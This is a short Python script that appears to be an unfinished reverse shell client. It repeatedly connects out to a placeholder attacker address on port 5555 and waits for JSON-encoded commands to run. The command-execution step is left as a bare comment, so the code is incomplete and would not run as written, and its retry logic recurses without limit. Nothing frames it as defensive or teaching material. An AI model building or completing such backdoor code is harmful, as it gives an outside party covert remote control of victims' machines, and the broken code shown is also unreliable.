import socket
import time
import json

def send(data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode())

def recieve():
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def connection():
    while True:
        time.sleep(10)
        try:
            s.connect(('Enter your ip',5555))
            shell()
            s.close()
            break
        except:
            connection()

def shell():
    while True:
        command = recieve()
        if command == 'quit':
            break
        else:
            #execute the command


s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connection()